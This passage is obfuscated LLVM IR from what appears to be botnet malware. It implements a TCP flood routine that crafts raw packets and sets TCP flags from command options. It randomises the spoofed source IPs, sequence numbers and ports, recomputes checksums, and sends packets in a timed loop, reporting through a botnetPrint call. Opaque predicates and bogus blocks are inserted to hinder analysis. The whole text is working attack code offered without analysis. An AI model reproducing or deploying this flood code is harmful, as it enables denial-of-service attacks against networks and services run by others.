  %235 = call i32 @strcmp(i8* %234, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.118, i32 0, i32 0)) #9
  %236 = icmp ne i32 %235, 0
  %237 = load i32, i32* @x.99
  %238 = load i32, i32* @y.100
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %236, label %269, label %245

; <label>:245:                                    ; preds = %originalBBpart216
  %246 = load i32, i32* @x.99
  %247 = load i32, i32* @y.100
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %245
  %254 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 0
  %256 = bitcast %union.anon* %255 to %struct.anon.0*
  %257 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %256, i32 0, i32 4
  %258 = load i16, i16* %257, align 4
  %259 = and i16 %258, -513
  %260 = or i16 %259, 512
  store i16 %260, i16* %257, align 4
  %261 = load i32, i32* @x.99
  %262 = load i32, i32* @y.100
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %421

; <label>:269:                                    ; preds = %originalBBpart216
  %270 = load i32, i32* @x.99
  %271 = load i32, i32* @y.100
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %269
  %278 = load i8*, i8** %23, align 8
  %279 = call i32 @strcmp(i8* %278, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.119, i32 0, i32 0)) #9
  %280 = icmp ne i32 %279, 0
  %281 = load i32, i32* @x.99
  %282 = load i32, i32* @y.100
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %280, label %297, label %289

; <label>:289:                                    ; preds = %originalBBpart231
  %290 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon* %291 to %struct.anon.0*
  %293 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %292, i32 0, i32 4
  %294 = load i16, i16* %293, align 4
  %295 = and i16 %294, -1025
  %296 = or i16 %295, 1024
  store i16 %296, i16* %293, align 4
  br label %404

; <label>:297:                                    ; preds = %originalBBpart231
  %298 = load i8*, i8** %23, align 8
  %299 = call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.120, i32 0, i32 0)) #9
  %300 = icmp ne i32 %299, 0
  br i1 %300, label %309, label %301

; <label>:301:                                    ; preds = %297
  %302 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon* %303 to %struct.anon.0*
  %305 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %304, i32 0, i32 4
  %306 = load i16, i16* %305, align 4
  %307 = and i16 %306, -257
  %308 = or i16 %307, 256
  store i16 %308, i16* %305, align 4
  br label %403

; <label>:309:                                    ; preds = %297
  %310 = load i32, i32* @x.99
  %311 = load i32, i32* @y.100
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %309
  %318 = load i8*, i8** %23, align 8
  %319 = call i32 @strcmp(i8* %318, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i32 0, i32 0)) #9
  %320 = icmp ne i32 %319, 0
  %321 = load i32, i32* @x.99
  %322 = load i32, i32* @y.100
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %320, label %353, label %329

; <label>:329:                                    ; preds = %originalBBpart235
  %330 = load i32, i32* @x.99
  %331 = load i32, i32* @y.100
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %329
  %338 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %339 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %338, i32 0, i32 0
  %340 = bitcast %union.anon* %339 to %struct.anon.0*
  %341 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %340, i32 0, i32 4
  %342 = load i16, i16* %341, align 4
  %343 = and i16 %342, -4097
  %344 = or i16 %343, 4096
  store i16 %344, i16* %341, align 4
  %345 = load i32, i32* @x.99
  %346 = load i32, i32* @y.100
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart261, label %originalBB37alteredBB

originalBBpart261:                                ; preds = %originalBB37
  br label %402

; <label>:353:                                    ; preds = %originalBBpart235
  %354 = load i32, i32* @x.99
  %355 = load i32, i32* @y.100
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %353
  %362 = load i8*, i8** %23, align 8
  %363 = call i32 @strcmp(i8* %362, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i32 0, i32 0)) #9
  %364 = icmp ne i32 %363, 0
  %365 = load i32, i32* @x.99
  %366 = load i32, i32* @y.100
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br i1 %364, label %397, label %373

; <label>:373:                                    ; preds = %originalBBpart265
  %374 = load i32, i32* @x.99
  %375 = load i32, i32* @y.100
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %373
  %382 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 0
  %384 = bitcast %union.anon* %383 to %struct.anon.0*
  %385 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 4
  %387 = and i16 %386, -2049
  %388 = or i16 %387, 2048
  store i16 %388, i16* %385, align 4
  %389 = load i32, i32* @x.99
  %390 = load i32, i32* @y.100
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBBpart288, label %originalBB67alteredBB

originalBBpart288:                                ; preds = %originalBB67
  br label %401

; <label>:397:                                    ; preds = %originalBBpart265
  %398 = load i32, i32* @switchCommStock, align 4
  %399 = load i8*, i8** %23, align 8
  %400 = call i32 (i32, i8*, ...) @botnetPrint(i32 %398, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.123, i32 0, i32 0), i8* %399)
  br label %401

; <label>:401:                                    ; preds = %397, %originalBBpart288
  br label %402

; <label>:402:                                    ; preds = %401, %originalBBpart261
  br label %403

; <label>:403:                                    ; preds = %402, %301
  br label %404

; <label>:404:                                    ; preds = %403, %289
  %405 = load i32, i32* @x.99
  %406 = load i32, i32* @y.100
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %404
  %413 = load i32, i32* @x.99
  %414 = load i32, i32* @y.100
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %421

; <label>:421:                                    ; preds = %originalBBpart292, %originalBBpart227
  %422 = load i32, i32* @x.99
  %423 = load i32, i32* @y.100
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %421
  %430 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %430, i8** %23, align 8
  %431 = load i32, i32* @x.99
  %432 = load i32, i32* @y.100
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %222

; <label>:439:                                    ; preds = %222
  br label %440

; <label>:440:                                    ; preds = %439, %183
  %441 = call i32 @rand_cmwc()
  %442 = trunc i32 %441 to i16
  %443 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %444 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %443, i32 0, i32 0
  %445 = bitcast %union.anon* %444 to %struct.anon.0*
  %446 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %445, i32 0, i32 5
  store i16 %442, i16* %446, align 2
  %447 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %448 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %447, i32 0, i32 0
  %449 = bitcast %union.anon* %448 to %struct.anon.0*
  %450 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %449, i32 0, i32 6
  store i16 0, i16* %450, align 4
  %451 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 0
  %453 = bitcast %union.anon* %452 to %struct.anon.0*
  %454 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %453, i32 0, i32 7
  store i16 0, i16* %454, align 2
  %455 = load i32, i32* %9, align 4
  %456 = icmp eq i32 %455, 0
  br i1 %456, label %457, label %459

; <label>:457:                                    ; preds = %440
  %458 = call i32 @rand_cmwc()
  br label %464

; <label>:459:                                    ; preds = %440
  %460 = load i32, i32* %9, align 4
  %461 = trunc i32 %460 to i16
  %462 = call zeroext i16 @htons(i16 zeroext %461) #10
  %463 = zext i16 %462 to i32
  br label %464

; <label>:464:                                    ; preds = %459, %457
  %465 = phi i32 [ %458, %457 ], [ %463, %459 ]
  %466 = trunc i32 %465 to i16
  %467 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 0
  %469 = bitcast %union.anon* %468 to %struct.anon.0*
  %470 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %469, i32 0, i32 1
  store i16 %466, i16* %470, align 2
  %471 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %472 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %473 = call zeroext i16 @tcpcsum(%struct.iphdr* %471, %struct.tcphdr* %472)
  %474 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 0
  %476 = bitcast %union.anon* %475 to %struct.anon.0*
  %477 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %476, i32 0, i32 6
  store i16 %473, i16* %477, align 4
  %478 = bitcast i8* %141 to i16*
  %479 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %480 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %479, i32 0, i32 2
  %481 = load i16, i16* %480, align 2
  %482 = zext i16 %481 to i32
  %483 = call zeroext i16 @csum(i16* %478, i32 %482)
  %484 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 7
  store i16 %483, i16* %485, align 2
  %486 = call i64 @time(i64* null) #3
  %487 = load i32, i32* %10, align 4
  %488 = sext i32 %487 to i64
  %489 = add nsw i64 %486, %488
  %490 = trunc i64 %489 to i32
  store i32 %490, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %491

; <label>:491:                                    ; preds = %577, %576, %464
  br label %492

; <label>:492:                                    ; preds = %491
  %493 = load i32, i32* @x.99
  %494 = load i32, i32* @y.100
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %492
  %501 = load i32, i32* %17, align 4
  %502 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %503 = call i64 @sendto(i32 %501, i8* %141, i64 %139, i32 0, %struct.sockaddr* %502, i32 16)
  %504 = load i32, i32* %19, align 4
  %505 = call i32 @GRIP(i32 %504)
  %506 = call i32 @htonl(i32 %505) #10
  %507 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %508 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %507, i32 0, i32 8
  store i32 %506, i32* %508, align 4
  %509 = call i32 @rand_cmwc()
  %510 = trunc i32 %509 to i16
  %511 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %512 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %511, i32 0, i32 3
  store i16 %510, i16* %512, align 4
  %513 = call i32 @rand_cmwc()
  %514 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %515 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %514, i32 0, i32 0
  %516 = bitcast %union.anon* %515 to %struct.anon.0*
  %517 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %516, i32 0, i32 2
  store i32 %513, i32* %517, align 4
  %518 = call i32 @rand_cmwc()
  %519 = trunc i32 %518 to i16
  %520 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %521 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %520, i32 0, i32 0
  %522 = bitcast %union.anon* %521 to %struct.anon.0*
  %523 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %522, i32 0, i32 0
  store i16 %519, i16* %523, align 4
  %524 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %525 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %524, i32 0, i32 0
  %526 = bitcast %union.anon* %525 to %struct.anon.0*
  %527 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %526, i32 0, i32 6
  store i16 0, i16* %527, align 4
  %528 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %529 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %530 = call zeroext i16 @tcpcsum(%struct.iphdr* %528, %struct.tcphdr* %529)
  %531 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 0
  %533 = bitcast %union.anon* %532 to %struct.anon.0*
  %534 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %533, i32 0, i32 6
  store i16 %530, i16* %534, align 4
  %535 = bitcast i8* %141 to i16*
  %536 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %537 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %536, i32 0, i32 2
  %538 = load i16, i16* %537, align 2
  %539 = zext i16 %538 to i32
  %540 = call zeroext i16 @csum(i16* %535, i32 %539)
  %541 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 7
  store i16 %540, i16* %542, align 2
  %543 = load i32, i32* %25, align 4
  %544 = load i32, i32* %15, align 4
  %545 = icmp eq i32 %543, %544
  %546 = load i32, i32* @x.99
  %547 = load i32, i32* @y.100
  %548 = sub i32 %546, 1
  %549 = mul i32 %546, %548
  %550 = urem i32 %549, 2
  %551 = icmp eq i32 %550, 0
  %552 = icmp slt i32 %547, 10
  %553 = or i1 %551, %552
  br i1 %553, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %545, label %554, label %577

; <label>:554:                                    ; preds = %originalBBpart2100
  %555 = load i32, i32* @x.99
  %556 = load i32, i32* @y.100
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %554
  %563 = call i64 @time(i64* null) #3
  %564 = load i32, i32* %24, align 4
  %565 = sext i32 %564 to i64
  %566 = icmp sgt i64 %563, %565
  %567 = load i32, i32* @x.99
  %568 = load i32, i32* @y.100
  %569 = sub i32 %567, 1
  %570 = mul i32 %567, %569
  %571 = urem i32 %570, 2
  %572 = icmp eq i32 %571, 0
  %573 = icmp slt i32 %568, 10
  %574 = or i1 %572, %573
  br i1 %574, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %566, label %575, label %576

; <label>:575:                                    ; preds = %originalBBpart2104
  br label %580

; <label>:576:                                    ; preds = %originalBBpart2104
  store i32 0, i32* %25, align 4
  br label %491

; <label>:577:                                    ; preds = %originalBBpart2100
  %578 = load i32, i32* %25, align 4
  %579 = add i32 %578, 1
  store i32 %579, i32* %25, align 4
  br label %491

; <label>:580:                                    ; preds = %575
  %581 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %581)
  br label %582

; <label>:582:                                    ; preds = %580, %originalBBpart212, %83, %76
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %34
  %583 = load i32, i32* %9, align 4
  %584 = trunc i32 %583 to i16
  %585 = call zeroext i16 @htons(i16 zeroext %584) #10
  %586 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %585, i16* %586, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %587 = load i8*, i8** %8, align 8
  %588 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %589 = call i32 @getHost(i8* %587, %struct.in_addr* %588)
  %590 = icmp ne i32 %589, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  store i32 1, i32* %18, align 4
  %591 = load i32, i32* %17, align 4
  %592 = bitcast i32* %18 to i8*
  %593 = call i32 @setsockopt(i32 %591, i32 0, i32 3, i8* %592, i32 4) #3
  %594 = icmp slt i32 %593, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %107
  %595 = load i32, i32* @switchCommStock, align 4
  %596 = call i32 (i32, i8*, ...) @botnetPrint(i32 %595, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.115, i32 0, i32 0))
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %225
  %597 = load i8*, i8** %23, align 8
  %598 = call i32 @strcmp(i8* %597, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.118, i32 0, i32 0)) #9
  %599 = icmp ne i32 %598, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %245
  %600 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %601 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %600, i32 0, i32 0
  %602 = bitcast %union.anon* %601 to %struct.anon.0*
  %603 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %602, i32 0, i32 4
  %604 = load i16, i16* %603, align 4
  %_ = shl i16 %604, -513
  %_19 = sub i16 %604, -513
  %gen = mul i16 %_19, -513
  %_20 = sub i16 0, %604
  %gen21 = add i16 %_20, -513
  %_22 = sub i16 0, %604
  %gen23 = add i16 %_22, -513
  %_24 = shl i16 %604, -513
  %605 = and i16 %604, -513
  %_25 = shl i16 %605, 512
  %606 = or i16 %605, 512
  store i16 %606, i16* %603, align 4
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %269
  %607 = load i8*, i8** %23, align 8
  %608 = call i32 @strcmp(i8* %607, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.119, i32 0, i32 0)) #9
  %609 = icmp ne i32 %608, 0
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %309
  %610 = load i8*, i8** %23, align 8
  %611 = call i32 @strcmp(i8* %610, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i32 0, i32 0)) #9
  %612 = icmp ne i32 %611, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %329
  %613 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %614 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %613, i32 0, i32 0
  %615 = bitcast %union.anon* %614 to %struct.anon.0*
  %616 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %615, i32 0, i32 4
  %617 = load i16, i16* %616, align 4
  %_38 = sub i16 %617, -4097
  %gen39 = mul i16 %_38, -4097
  %_40 = sub i16 0, %617
  %gen41 = add i16 %_40, -4097
  %_42 = sub i16 %617, -4097
  %gen43 = mul i16 %_42, -4097
  %_44 = sub i16 %617, -4097
  %gen45 = mul i16 %_44, -4097
  %_46 = sub i16 0, %617
  %gen47 = add i16 %_46, -4097
  %_48 = shl i16 %617, -4097
  %_49 = shl i16 %617, -4097
  %_50 = sub i16 0, %617
  %gen51 = add i16 %_50, -4097
  %618 = and i16 %617, -4097
  %_52 = sub i16 %618, 4096
  %gen53 = mul i16 %_52, 4096
  %_54 = sub i16 0, %618
  %gen55 = add i16 %_54, 4096
  %_56 = sub i16 %618, 4096
  %gen57 = mul i16 %_56, 4096
  %_58 = sub i16 %618, 4096
  %gen59 = mul i16 %_58, 4096
  %619 = or i16 %618, 4096
  store i16 %619, i16* %616, align 4
  br label %originalBB37

originalBB63alteredBB:                            ; preds = %originalBB63, %353
  %620 = load i8*, i8** %23, align 8
  %621 = call i32 @strcmp(i8* %620, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i32 0, i32 0)) #9
  %622 = icmp ne i32 %621, 0
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %373
  %623 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %624 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %623, i32 0, i32 0
  %625 = bitcast %union.anon* %624 to %struct.anon.0*
  %626 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %625, i32 0, i32 4
  %627 = load i16, i16* %626, align 4
  %_68 = shl i16 %627, -2049
  %_69 = sub i16 %627, -2049
  %gen70 = mul i16 %_69, -2049
  %_71 = sub i16 %627, -2049
  %gen72 = mul i16 %_71, -2049
  %_73 = shl i16 %627, -2049
  %_74 = sub i16 0, %627
  %gen75 = add i16 %_74, -2049
  %_76 = shl i16 %627, -2049
  %_77 = shl i16 %627, -2049
  %_78 = shl i16 %627, -2049
  %628 = and i16 %627, -2049
  %_79 = sub i16 %628, 2048
  %gen80 = mul i16 %_79, 2048
  %_81 = sub i16 %628, 2048
  %gen82 = mul i16 %_81, 2048
  %_83 = shl i16 %628, 2048
  %_84 = shl i16 %628, 2048
  %_85 = sub i16 %628, 2048
  %gen86 = mul i16 %_85, 2048
  %629 = or i16 %628, 2048
  store i16 %629, i16* %626, align 4
  br label %originalBB67

originalBB90alteredBB:                            ; preds = %originalBB90, %404
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %421
  %630 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %630, i8** %23, align 8
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %492
  %631 = load i32, i32* %17, align 4
  %632 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %633 = call i64 @sendto(i32 %631, i8* %141, i64 %139, i32 0, %struct.sockaddr* %632, i32 16)
  %634 = load i32, i32* %19, align 4
  %635 = call i32 @GRIP(i32 %634)
  %636 = call i32 @htonl(i32 %635) #10
  %637 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %638 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %637, i32 0, i32 8
  store i32 %636, i32* %638, align 4
  %639 = call i32 @rand_cmwc()
  %640 = trunc i32 %639 to i16
  %641 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %642 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %641, i32 0, i32 3
  store i16 %640, i16* %642, align 4
  %643 = call i32 @rand_cmwc()
  %644 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %645 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %644, i32 0, i32 0
  %646 = bitcast %union.anon* %645 to %struct.anon.0*
  %647 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %646, i32 0, i32 2
  store i32 %643, i32* %647, align 4
  %648 = call i32 @rand_cmwc()
  %649 = trunc i32 %648 to i16
  %650 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %651 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %650, i32 0, i32 0
  %652 = bitcast %union.anon* %651 to %struct.anon.0*
  %653 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %652, i32 0, i32 0
  store i16 %649, i16* %653, align 4
  %654 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %655 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %654, i32 0, i32 0
  %656 = bitcast %union.anon* %655 to %struct.anon.0*
  %657 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %656, i32 0, i32 6
  store i16 0, i16* %657, align 4
  %658 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %659 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %660 = call zeroext i16 @tcpcsum(%struct.iphdr* %658, %struct.tcphdr* %659)
  %661 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %662 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %661, i32 0, i32 0
  %663 = bitcast %union.anon* %662 to %struct.anon.0*
  %664 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %663, i32 0, i32 6
  store i16 %660, i16* %664, align 4
  %665 = bitcast i8* %141 to i16*
  %666 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %667 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %666, i32 0, i32 2
  %668 = load i16, i16* %667, align 2
  %669 = zext i16 %668 to i32
  %670 = call zeroext i16 @csum(i16* %665, i32 %669)
  %671 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %672 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %671, i32 0, i32 7
  store i16 %670, i16* %672, align 2
  %673 = load i32, i32* %25, align 4
  %674 = load i32, i32* %15, align 4
  %675 = icmp eq i32 %673, %674
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %554
  %676 = call i64 @time(i64* null) #3
  %677 = load i32, i32* %24, align 4
  %678 = sext i32 %677 to i64
  %679 = icmp sgt i64 %676, %678
  br label %originalBB102
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
